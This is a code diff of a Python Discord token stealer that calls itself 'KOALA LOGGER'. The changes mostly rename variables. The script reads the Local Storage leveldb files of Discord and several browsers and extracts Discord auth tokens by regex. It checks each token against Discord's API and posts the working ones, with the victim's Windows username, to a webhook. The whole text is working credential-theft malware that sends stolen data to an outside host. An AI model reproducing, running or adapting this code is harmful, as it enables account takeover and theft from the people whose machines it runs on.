@@ -6,54 +6,52 @@ import getpass
 import os
 
 WEBHOOK = ""
-appdatapath = os.getenv('APPDATA')
+appdata = os.getenv('APPDATA')
 paths = [
-   appdatapath + '\\Discord',
-   appdatapath + '\\discordcanary',
-   appdatapath + '\\discordptb',
-   appdatapath + '\\Google\\Chrome\\User Data\\Default',
-   appdatapath + '\\Opera Software\\Opera Stable',
-   appdatapath + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-   appdatapath + '\\Yandex\\YandexBrowser\\User Data\\Default']
-tknpaths = []
-def getTokens(path):
+   appdata + '\\Discord',
+   appdata + '\\discordcanary',
+   appdata + '\\discordptb',
+   appdata + '\\Google\\Chrome\\User Data\\Default',
+   appdata + '\\Opera Software\\Opera Stable',
+   appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+   appdata + '\\Yandex\\YandexBrowser\\User Data\\Default']
+
+pathkns = []
+def find(path):
 	tokns = []
-	files = glob.glob(path + r"\Local Storage\leveldb\*.ldb")
-	files.extend(glob.glob(path + r"\Local Storage\leveldb\*.log"))
-	for file in files:
-		with open( file, 'r',encoding='ISO-8859-1') as content_file:
+	file = glob.glob(path + r"\Local Storage\leveldb\*.ldb")
+	file.extend(glob.glob(path + r"\Local Storage\leveldb\*.log"))
+	for i in file:
+		with open( i, 'r',encoding='ISO-8859-1') as filewstuff:
 			try:
-				content = content_file.read()
-				possible = [x.group() for x in re.finditer(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[a-zA-Z0-9_\-]{84}', content)]
+				possibletoken = filewstuff.read()
+				dec = [x.group() for x in re.finditer(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[a-zA-Z0-9_\-]{84}', possibletoken)]
 				tokenpath = ['\n\n' + path + ' :\n']
-				if len(possible) > 0:
-					tknpaths.append(tokenpath)
-					tokns.extend(possible)
-					#print(possible)
+				if len(dec) > 0 and len(dec) < 100:
+					pathkns.append(dec)
+					tokns.extend(dec)
 			except:
 				pass
 	return tokns
 
-tksn = []
+auth = []
 def SendTokens(tkns):
-	content = f"**__[+ KOALA LOGGER +]__** Logged {len(tkns)} tokens from {getpass.getuser()}\n"
+	possibletoken = f"@everyone \n> **__[+ KOALA LOGGER +]__** Logged {len(tkns)} tokens from {getpass.getuser()}\n"
 	for tkn in tkns:
-		content += tkn + "\n"
-	payload = {
-	"content" : content,
+		possibletoken += tkn + "\n"
+	data = {
+	"content" : possibletoken,
 	"username" : "Token Logger By Infamous Koala"
 	}
-	requests.post(WEBHOOK, data=payload)
+	requests.post(WEBHOOK, data=data)
 for _dir in paths:
-	tksn.extend(getTokens(_dir))
-if len(tksn) < 1:
-	requests.post(WEBHOOK, data="Nothing found")
-for check in tksn:
+	auth.extend(find(_dir))
+for check in auth:
 	check = str(check)
 	if check.startswith('\n'):
 		continue
 	else:
-		sake = requests.get('https://canary.discordapp.com/api/v9/users/@me', headers = {'Authorization': check}) #update this api url in the future when they actually release v10 for normal members
-	if sake.status_code == 200:
-	    tksn.append("token pulled:" + check)
-SendTokens(tksn)
+		r = requests.get('https://canary.discordapp.com/api/v9/users/@me', headers = {'Authorization': check}) #update this api url in the future when they actually release v10 for normal members
+	if r.status_code == 200:
+	    auth.append("token pulled:" + check)
+SendTokens(auth)
